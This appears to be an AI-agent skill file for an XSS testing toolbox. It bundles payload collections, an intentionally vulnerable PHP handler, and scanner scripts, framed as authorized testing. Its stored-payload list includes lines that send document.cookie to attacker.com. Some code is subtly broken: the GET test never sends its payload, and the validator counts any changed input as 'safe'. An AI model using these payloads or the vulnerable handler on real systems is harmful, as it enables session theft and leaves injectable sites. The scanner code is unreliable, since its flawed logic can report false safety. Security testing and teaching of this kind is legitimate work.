---
name: acidrain-xss-security-testing
description: Use AcidRain's XSS analysis resources, JavaScript utilities, and PHP injection testing samples for authorized web security research and learning.
triggers:
  - "test for XSS vulnerabilities in my application"
  - "use AcidRain security scripts"
  - "analyze cross-site scripting with AcidRain"
  - "run XSS injection tests"
  - "set up AcidRain for security research"
  - "create XSS payload examples"
  - "test web application security with AcidRain"
  - "demonstrate XSS attack vectors"
---

# AcidRain XSS Security Testing Skill

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

AcidRain is a web security toolbox providing XSS injection resources, JavaScript utilities, and PHP scripts for authorized security testing and educational purposes. It contains browser-side and server-side materials organized for web security research, input handling analysis, and controlled vulnerability testing.

**Key capabilities:**
- XSS analysis and demonstration resources
- Client-side JavaScript security utilities
- Server-side PHP testing examples
- Injection testing samples
- Web security research snippets

**Important:** Only use AcidRain against systems you own or have explicit written authorization to test.

## Installation

Clone the repository and navigate to the project directory:

```bash
git clone https://github.com/henry-lewiskpp1107/acidrain-security-script-hub.git
cd acidrain-security-script-hub
```

Expected directory structure:

```
acidrain_xss_toolbox/
├── scripts/
│   ├── javascript/
│   ├── php/
│   └── xss/
├── configs/
├── examples/
├── docs/
├── LICENSE
└── README.md
```

## Project Structure

### JavaScript Resources

Located in `scripts/javascript/`, these client-side utilities run in the browser for security research:

```javascript
// Example: Basic XSS payload tester
// File: scripts/javascript/xss-tester.js

function testXSSPayload(payload, targetElement) {
  // Inject payload into specified DOM element
  const container = document.querySelector(targetElement);
  if (container) {
    container.innerHTML = payload;
    console.log(`Payload injected into ${targetElement}`);
  } else {
    console.error(`Target element ${targetElement} not found`);
  }
}

// Usage in authorized testing environment
testXSSPayload('<script>alert("XSS Test")</script>', '#test-area');
```

### PHP Resources

Located in `scripts/php/`, these server-side examples demonstrate vulnerability patterns:

```php
<?php
// Example: Vulnerable input handler for demonstration
// File: scripts/php/vulnerable-input.php

// WARNING: This is intentionally vulnerable for research purposes only

$user_input = $_GET['input'] ?? '';

// Unsafe output - demonstrates XSS vulnerability
echo "<div>User input: " . $user_input . "</div>";

// Safe output - demonstrates proper escaping
echo "<div>Safe input: " . htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') . "</div>";
?>
```

### XSS Payload Examples

Located in `scripts/xss/`, these contain common XSS vectors for testing:

```javascript
// Example: XSS payload collection
// File: scripts/xss/payloads.js

const xssPayloads = {
  basic: {
    script: '<script>alert("XSS")</script>',
    img: '<img src=x onerror=alert("XSS")>',
    svg: '<svg onload=alert("XSS")>',
  },
  
  eventHandlers: {
    onClick: '<div onclick=alert("XSS")>Click me</div>',
    onMouseOver: '<span onmouseover=alert("XSS")>Hover</span>',
    onLoad: '<body onload=alert("XSS")>',
  },
  
  encoding: {
    htmlEntity: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    urlEncoded: '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
    unicode: '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
  }
};

function getPayload(category, type) {
  return xssPayloads[category]?.[type] || null;
}

// Export for use in testing
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { xssPayloads, getPayload };
}
```

## Common Usage Patterns

### Setting Up a Test Environment

Create an isolated testing environment for AcidRain:

```bash
# Create dedicated test directory
mkdir -p ~/security-lab/acidrain-tests
cd ~/security-lab/acidrain-tests

# Copy scripts you want to test
cp -r /path/to/acidrain_xss_toolbox/scripts .

# Set up local PHP server for PHP testing
php -S localhost:8080 -t .
```

### Testing XSS Vulnerabilities

```javascript
// Example: XSS vulnerability scanner
// File: examples/xss-scanner.js

class XSSScanner {
  constructor(targetUrl) {
    this.targetUrl = targetUrl;
    this.results = [];
  }
  
  async testPayload(payload, parameter) {
    const testUrl = `${this.targetUrl}?${parameter}=${encodeURIComponent(payload)}`;
    
    try {
      const response = await fetch(testUrl);
      const html = await response.text();
      
      // Check if payload appears unescaped in response
      const isVulnerable = html.includes(payload);
      
      this.results.push({
        parameter,
        payload,
        vulnerable: isVulnerable,
        url: testUrl
      });
      
      return isVulnerable;
    } catch (error) {
      console.error(`Error testing ${parameter}:`, error);
      return false;
    }
  }
  
  async runTests(payloads, parameters) {
    for (const param of parameters) {
      for (const payload of payloads) {
        await this.testPayload(payload, param);
      }
    }
    return this.results;
  }
  
  generateReport() {
    const vulnerable = this.results.filter(r => r.vulnerable);
    return {
      total: this.results.length,
      vulnerableCount: vulnerable.length,
      vulnerabilities: vulnerable
    };
  }
}

// Usage in authorized testing
const scanner = new XSSScanner('http://localhost:8080/test.php');
const testPayloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'];
const testParams = ['search', 'name', 'comment'];

scanner.runTests(testPayloads, testParams).then(() => {
  console.log(scanner.generateReport());
});
```

### PHP Injection Testing

```php
<?php
// Example: Input validation tester
// File: examples/input-validator.php

class InputValidator {
    private $testResults = [];
    
    public function testInput($input, $validationMethod) {
        $original = $input;
        $sanitized = $this->$validationMethod($input);
        
        $this->testResults[] = [
            'original' => $original,
            'sanitized' => $sanitized,
            'method' => $validationMethod,
            'safe' => $original !== $sanitized
        ];
        
        return $sanitized;
    }
    
    // Demonstrates proper HTML escaping
    private function htmlEscape($input) {
        return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
    
    // Demonstrates URL encoding
    private function urlEncode($input) {
        return urlencode($input);
    }
    
    // Demonstrates input filtering
    private function stripTags($input) {
        return strip_tags($input);
    }
    
    public function getResults() {
        return $this->testResults;
    }
}

// Usage in controlled testing environment
$validator = new InputValidator();

$testInputs = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
];

foreach ($testInputs as $input) {
    $validator->testInput($input, 'htmlEscape');
    $validator->testInput($input, 'stripTags');
}

echo json_encode($validator->getResults(), JSON_PRETTY_PRINT);
?>
```

## Configuration

### Environment Setup

Create a configuration file for your testing environment:

```javascript
// config/testing-env.js

const config = {
  // Target application settings
  targetUrl: process.env.ACIDRAIN_TARGET_URL || 'http://localhost:8080',
  
  // Testing parameters
  timeout: parseInt(process.env.ACIDRAIN_TIMEOUT) || 5000,
  maxConcurrent: parseInt(process.env.ACIDRAIN_MAX_CONCURRENT) || 3,
  
  // Logging
  logLevel: process.env.ACIDRAIN_LOG_LEVEL || 'info',
  logFile: process.env.ACIDRAIN_LOG_FILE || './acidrain-tests.log',
  
  // Report generation
  reportFormat: process.env.ACIDRAIN_REPORT_FORMAT || 'json',
  reportPath: process.env.ACIDRAIN_REPORT_PATH || './reports/',
};

module.exports = config;
```

### PHP Configuration

```php
<?php
// config/php-config.php

return [
    'target_url' => getenv('ACIDRAIN_TARGET_URL') ?: 'http://localhost:8080',
    'test_timeout' => (int)(getenv('ACIDRAIN_TIMEOUT') ?: 30),
    'log_file' => getenv('ACIDRAIN_LOG_FILE') ?: './acidrain-php.log',
    'report_path' => getenv('ACIDRAIN_REPORT_PATH') ?: './reports/',
];
?>
```

## Real-World Testing Examples

### Complete XSS Test Suite

```javascript
// examples/complete-xss-test.js

const fs = require('fs');
const config = require('../config/testing-env');

class AcidRainXSSTest {
  constructor() {
    this.config = config;
    this.payloads = this.loadPayloads();
    this.results = {
      startTime: new Date(),
      tests: [],
      summary: {}
    };
  }
  
  loadPayloads() {
    return {
      reflected: [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
      ],
      stored: [
        '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
        '<img src=x onerror=this.src="http://attacker.com/log?"+document.cookie>',
      ],
      dom: [
        '#<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
      ]
    };
  }
  
  async testEndpoint(endpoint, payload, method = 'GET') {
    const testData = {
      endpoint,
      payload,
      method,
      timestamp: new Date(),
      vulnerable: false,
      response: null
    };
    
    try {
      const url = `${this.config.targetUrl}${endpoint}`;
      const options = {
        method,
        headers: { 'Content-Type': 'application/json' }
      };
      
      if (method === 'POST') {
        options.body = JSON.stringify({ input: payload });
      } else {
        const testUrl = `${url}?input=${encodeURIComponent(payload)}`;
      }
      
      const response = await fetch(url, options);
      const html = await response.text();
      
      testData.response = {
        status: response.status,
        contentType: response.headers.get('content-type'),
        bodyLength: html.length
      };
      
      // Check for reflected payload
      testData.vulnerable = html.includes(payload) && !html.includes(this.escapeHtml(payload));
      
    } catch (error) {
      testData.error = error.message;
    }
    
    this.results.tests.push(testData);
    return testData;
  }
  
  escapeHtml(text) {
    return text
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
  
  async runFullSuite(endpoints) {
    console.log('Starting AcidRain XSS test suite...');
    
    for (const endpoint of endpoints) {
      for (const [category, payloads] of Object.entries(this.payloads)) {
        for (const payload of payloads) {
          await this.testEndpoint(endpoint, payload);
          // Rate limiting
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }
    }
    
    this.generateSummary();
    return this.results;
  }
  
  generateSummary() {
    const vulnerable = this.results.tests.filter(t => t.vulnerable);
    this.results.summary = {
      totalTests: this.results.tests.length,
      vulnerableCount: vulnerable.length,
      endTime: new Date(),
      duration: new Date() - this.results.startTime,
      vulnerabilities: vulnerable.map(v => ({
        endpoint: v.endpoint,
        payload: v.payload,
        method: v.method
      }))
    };
  }
  
  saveReport() {
    const reportPath = `${this.config.reportPath}xss-test-${Date.now()}.json`;
    fs.mkdirSync(this.config.reportPath, { recursive: true });
    fs.writeFileSync(reportPath, JSON.stringify(this.results, null, 2));
    console.log(`Report saved to ${reportPath}`);
    return reportPath;
  }
}

// Usage
const tester = new AcidRainXSSTest();
const testEndpoints = ['/search', '/comment', '/profile'];

tester.runFullSuite(testEndpoints).then(() => {
  tester.saveReport();
  console.log('Test Summary:', tester.results.summary);
});
```

## Troubleshooting

### Common Issues

**Issue: Scripts not executing in browser**

```javascript
// Check Content Security Policy
const checkCSP = () => {
  const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
  if (meta) {
    console.log('CSP detected:', meta.content);
    return meta.content;
  }
  return null;
};

// Test from browser console
checkCSP();
```

**Issue: PHP scripts not processing input**

```php
<?php
// Debug input handling
error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "GET parameters: " . print_r($_GET, true) . "\n";
echo "POST parameters: " . print_r($_POST, true) . "\n";
echo "Request method: " . $_SERVER['REQUEST_METHOD'] . "\n";
?>
```

**Issue: Payloads being blocked**

```javascript
// Test with minimal payload first
const minimalPayloads = [
  '<b>test</b>',
  '<script>console.log("test")</script>',
  'alert(1)',
];

// Gradually increase complexity to identify blocking point
```

### Environment Validation

```bash
# Check PHP version and configuration
php -v
php -m | grep -E 'curl|json|mbstring'

# Test local server
curl -i http://localhost:8080/

# Verify write permissions for reports
mkdir -p ./reports && touch ./reports/test.txt && rm ./reports/test.txt
```

## Best Practices

1. **Always get authorization** before testing any application
2. **Use isolated environments** for security research
3. **Document all findings** with timestamps and evidence
4. **Never test in production** without explicit permission
5. **Rate limit your tests** to avoid disrupting services
6. **Clean up test data** after completing research
7. **Store credentials in environment variables**, never in code:

```bash
export ACIDRAIN_TARGET_URL="http://localhost:8080"
export ACIDRAIN_LOG_FILE="./logs/acidrain.log"
export ACIDRAIN_REPORT_PATH="./reports/"
```

## Integration with Security Workflows

```javascript
// Example: Integrate with CI/CD security pipeline
// File: examples/ci-integration.js

const AcidRainXSSTest = require('./complete-xss-test');

async function runSecurityScan() {
  const tester = new AcidRainXSSTest();
  
  const stagingEndpoints = [
    '/api/search',
    '/api/comments',
    '/api/user/profile'
  ];
  
  const results = await tester.runFullSuite(stagingEndpoints);
  tester.saveReport();
  
  // Fail CI if vulnerabilities found
  if (results.summary.vulnerableCount > 0) {
    console.error(`Found ${results.summary.vulnerableCount} XSS vulnerabilities!`);
    process.exit(1);
  }
  
  console.log('No XSS vulnerabilities detected.');
  process.exit(0);
}

runSecurityScan();
```
